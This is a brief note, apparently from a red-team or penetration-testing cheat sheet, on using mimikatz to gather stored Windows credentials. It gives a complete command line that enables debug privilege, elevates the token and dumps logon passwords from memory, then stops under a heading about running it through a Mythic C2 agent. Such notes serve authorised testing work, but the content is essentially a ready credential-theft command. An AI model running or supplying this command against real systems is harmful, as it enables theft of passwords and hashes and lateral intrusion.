Used to gather stored credentials

Running from binary context
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

Running from mythic c2 contact